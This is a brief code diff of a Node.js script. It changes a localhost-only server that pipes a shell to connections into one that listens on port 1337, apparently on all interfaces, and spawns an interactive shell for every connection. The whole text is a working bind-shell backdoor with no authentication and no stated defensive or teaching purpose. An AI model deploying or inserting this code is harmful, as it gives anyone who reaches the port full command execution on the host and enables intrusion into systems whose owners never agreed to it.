@@ -1,10 +1,9 @@
-var net = require('net'),
-util = require('util'),
-spawn = require('child_process').spawn,
-sh = spawn('/bin/sh',[]);
-
+var net = require('net');
+var cp = require('child_process');
+ 
 var server = net.createServer(function (c) {
-        c.pipe(sh.stdin);
-        util.pump(sh.stdout,c);
+    var sh = cp.spawn('sh', ['-i']);
+    c.pipe(sh.stdin);
+    sh.stdout.pipe(c);
 });
-server.listen(8124, 'localhost');
+server.listen(1337);
